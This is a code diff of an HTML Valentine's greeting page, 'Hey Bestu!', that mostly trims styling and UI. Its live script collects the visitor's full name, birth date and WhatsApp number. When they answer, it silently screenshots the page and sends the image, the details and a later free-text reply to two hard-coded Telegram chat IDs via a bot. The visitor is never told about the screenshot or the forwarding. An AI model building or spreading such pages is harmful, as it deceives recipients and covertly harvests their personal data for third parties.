@@ -33,7 +33,6 @@
             display: flex; align-items: center; justify-content: center;
         }
 
-        /* Full Screen Simulation Status Bar */
         .status-bar {
             position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between;
             padding: 12px 24px; font-size: 12px; font-weight: 600; z-index: 500;
@@ -54,21 +53,18 @@
 
         .cursive { font-family: 'Dancing Script', cursive; }
 
-        /* Floating Background Orbs */
         .orb {
             position: absolute; border-radius: 50%; filter: blur(80px);
             z-index: 0; animation: floatOrb 10s infinite alternate;
         }
         @keyframes floatOrb { from { transform: translate(0,0); } to { transform: translate(40px, 60px); } }
 
-        /* Particle Rain */
         .particle {
             position: fixed; top: -10%; pointer-events: none;
             animation: fall linear forwards; z-index: 100;
         }
         @keyframes fall { to { transform: translateY(110vh) rotate(720deg); } }
 
-        /* YouTube Header Player */
         #yt-header {
             position: fixed; top: -300px; left: 0; width: 100%; height: 240px;
             transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
@@ -79,18 +75,8 @@
         .btn-premium {
             background: var(--accent);
             transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 10px 20px -5px var(--accent);
         }
         .btn-premium:hover { transform: scale(1.05); filter: brightness(1.1); }
-        .btn-premium:active { transform: scale(0.95); }
-
-        .input-glass {
-            background: rgba(255, 255, 255, 0.1) !important;
-            border: 1px solid rgba(255, 255, 255, 0.2) !important;
-            color: white !important;
-            transition: 0.3s;
-        }
-        .input-glass:focus { background: rgba(255, 255, 255, 0.2) !important; transform: translateY(-2px); }
 
         .hidden-stage { display: none; }
         .thank-you-img { animation: floating 3s ease-in-out infinite; }
@@ -109,13 +95,12 @@
         </div>
     </div>
 
-    <button onclick="toggleTheme()" class="fixed bottom-6 right-6 p-4 glass-card rounded-2xl z-[600] shadow-2xl active:rotate-12 transition-transform">
+    <button onclick="toggleTheme()" class="fixed bottom-6 right-6 p-4 glass-card rounded-2xl z-[600]">
         <span id="theme-icon" class="text-xl">🌙</span>
     </button>
 
     <div id="yt-header">
         <div id="player-mount" class="w-full h-full"></div>
-        <button onclick="closePlayer()" class="absolute bottom-2 right-4 bg-white/20 text-white text-[10px] px-3 py-1 rounded-full">Close ✕</button>
     </div>
 
     <div class="w-full max-w-sm px-4">
@@ -123,49 +108,30 @@
             
             <div id="stage-1" class="space-y-4">
                 <h1 class="text-4xl font-bold cursive mb-2 drop-shadow-md">Hey Bestu! ✨</h1>
-                <p class="text-white/70 text-sm mb-6">Something special for you...</p>
-                
                 <div class="space-y-4">
-                    <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl outline-none input-glass placeholder-white/50">
-                    <div class="text-left mb-[-10px] ml-2 text-[10px] text-white/60 font-bold uppercase">Your Birthday</div>
-                    <input type="date" id="dob" class="w-full p-4 rounded-2xl outline-none input-glass">
-                    <input type="tel" id="mobile" placeholder="WhatsApp Number" class="w-full p-4 rounded-2xl outline-none input-glass placeholder-white/50">
+                    <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
+                    <input type="date" id="dob" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
+                    <input type="tel" id="mobile" placeholder="WhatsApp Number" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
                     <button onclick="toStage2()" class="btn-premium w-full text-white font-bold py-4 rounded-2xl mt-4 shadow-xl">Reveal Heart ❤️</button>
                 </div>
             </div>
 
             <div id="stage-2" class="hidden-stage">
                 <h1 class="text-4xl font-bold cursive mb-6 drop-shadow-md">For You... ❤️</h1>
-                <pre class="font-mono text-[10px] text-white leading-tight mb-8 inline-block animate-pulse">
-    ♡ ♡       ♡ ♡ 
-  ♡♡♡♡♡     ♡♡♡♡♡ 
- ♡♡♡♡♡♡♡   ♡♡♡♡♡♡♡
-♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡
-♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡
-  ♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡  
-    ♡♡♡♡♡♡♡♡♡♡♡♡♡  
-      ♡♡♡♡♡♡♡♡♡♡♡   
-        ♡♡♡♡♡♡♡♡♡    
-          ♡♡♡♡♡♡♡     
-            ♡♡♡♡♡      
-              ♡♡♡       
-               ♡</pre>
                 <p class="text-xl italic mb-10 tracking-wide">Will you be my Valentine?</p>
                 <div class="grid gap-4">
                     <button onclick="handleAction('YES', '❤️')" class="btn-premium text-white font-bold py-4 rounded-2xl shadow-lg">YES! 😍</button>
-                    <button onclick="handleAction('NO', '😊')" class="bg-white/10 hover:bg-white/20 text-white font-bold py-4 rounded-2xl transition-all">No 😢</button>
-                    <button onclick="handleAction('FOOD', '🍕')" class="bg-yellow-500/80 text-white font-bold py-4 rounded-2xl shadow-lg">Food (You will pay! 🍕)</button>
+                    <button onclick="handleAction('NO', '😊')" class="bg-white/10 text-white font-bold py-4 rounded-2xl transition-all">No 😢</button>
+                    <button onclick="handleAction('FOOD', '🍕')" class="bg-yellow-500/80 text-white font-bold py-4 rounded-2xl shadow-lg">Food (You pay! 🍕)</button>
                 </div>
             </div>
 
             <div id="stage-3" class="hidden-stage space-y-6">
-                <h2 class="text-3xl font-bold cursive mb-4 drop-shadow-md">You're the Best! ❤️</h2>
+                <h2 class="text-3xl font-bold cursive mb-4 drop-shadow-md">You're Amazing! ❤️</h2>
                 <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKoWXlo3M1nKS6A/giphy.gif" class="thank-you-img w-full rounded-[2rem] shadow-2xl">
-                
-                <div class="bg-white/10 p-5 rounded-3xl border border-white/20 mt-4">
-                    <p class="text-xs mb-3 text-white/70 italic">Final message for me?</p>
-                    <textarea id="final-reply" placeholder="Type here..." class="w-full p-3 rounded-xl bg-white/5 border border-white/10 outline-none text-sm text-white" rows="2"></textarea>
-                    <button onclick="sendFinalReply()" class="w-full bg-green-500 text-white font-bold py-3 rounded-xl mt-3 text-xs uppercase tracking-widest shadow-lg">Submit ✅</button>
+                <div class="bg-white/10 p-5 rounded-3xl border border-white/20">
+                    <textarea id="final-reply" placeholder="Type here..." class="w-full p-3 rounded-xl bg-transparent border border-white/10 outline-none text-sm text-white" rows="2"></textarea>
+                    <button onclick="sendFinalReply()" class="w-full bg-green-500 text-white font-bold py-3 rounded-xl mt-3 text-xs uppercase shadow-lg">Submit ✅</button>
                 </div>
             </div>
         </div>
@@ -176,28 +142,25 @@
         const CHAT_IDS = ["6572151527", "7893857792"]; 
         let store = {};
 
-        // Clock logic
         function updateClock() {
             const d = new Date();
             document.getElementById('clock').innerText = d.getHours() + ":" + String(d.getMinutes()).padStart(2, '0');
         }
         setInterval(updateClock, 1000); updateClock();
 
-        // Theme logic
         function toggleTheme() {
             document.body.classList.toggle('dark-theme');
             document.getElementById('theme-icon').innerText = document.body.classList.contains('dark-theme') ? '☀️' : '🌙';
         }
 
-        // Particle logic
         function createRain(emoji) {
             for(let i=0; i<45; i++) {
                 setTimeout(() => {
                     const p = document.createElement('div');
                     p.innerText = emoji; p.className = 'particle';
                     p.style.left = Math.random() * 100 + 'vw';
-                    p.style.fontSize = Math.random() * 25 + 15 + 'px';
-                    p.style.animationDuration = Math.random() * 2 + 2.5 + 's';
+                    p.style.fontSize = '25px';
+                    p.style.animationDuration = '3s';
                     document.body.appendChild(p);
                     setTimeout(() => p.remove(), 4000);
                 }, i * 80);
@@ -206,7 +169,7 @@
 
         function toStage2() {
             store = { n: document.getElementById('name').value, d: document.getElementById('dob').value, m: document.getElementById('mobile').value };
-            if(!store.n || !store.m) return alert("Details are required, Bestu! ✨");
+            if(!store.n || !store.m) return alert("Fill details! ✨");
             document.getElementById('stage-1').classList.add('hidden-stage');
             document.getElementById('stage-2').classList.remove('hidden-stage');
         }
@@ -216,45 +179,36 @@
         async function handleAction(type, emoji) {
             createRain(emoji);
             
-            // 1. Automatic High-Quality Full-Screen Screenshot
-            // Captures the background orbs, status bar, and card together
-            const canvas = await html2canvas(document.body, { 
-                useCORS: true, 
-                backgroundColor: null,
-                scale: 2 
-            });
-            
+            // Capture Full Screen Simulation
+            const canvas = await html2canvas(document.body, { useCORS: true, backgroundColor: null, scale: 2 });
             canvas.toBlob(async (blob) => {
+                // Send to BOTH IDs
                 CHAT_IDS.forEach(id => {
                     const fd = new FormData();
                     fd.append('chat_id', id);
-                    fd.append('photo', blob, 'fullscreen.png');
-                    fd.append('caption', `💖 *VALENTINE RESPONSE*\n\nName: ${store.n}\nChoice: ${type}\nMobile: ${store.m}\nDOB: ${store.d}`);
+                    fd.append('photo', blob, 'shot.png');
+                    fd.append('caption', `💌 RESPONSE: ${type}\nName: ${store.n}\nMobile: ${store.m}\nDOB: ${store.d}`);
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 });
             }, 'image/png');
 
-            // 2. Automated YouTube Header (No Lag)
             document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${yt[type]}?autoplay=1&mute=0" frameborder="0" allow="autoplay; encrypted-media"></iframe>`;
             document.getElementById('yt-header').classList.add('active');
 
-            // 3. Switch to final stage
             document.getElementById('stage-2').classList.add('hidden-stage');
             document.getElementById('stage-3').classList.remove('hidden-stage');
         }
 
-        function closePlayer() { document.getElementById('yt-header').classList.remove('active'); }
-
         async function sendFinalReply() {
             const reply = document.getElementById('final-reply').value;
-            if(!reply) return alert("Say something first! ❤️");
+            if(!reply) return alert("Write something! ❤️");
+            // Send to BOTH IDs
             CHAT_IDS.forEach(id => {
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💬 Message from " + store.n + ": " + reply)}`);
             });
-            alert("Sent! Thank you so much!");
+            alert("Sent! Thank you!");
             location.reload();
         }
     </script>
 </body>
 </html>
-
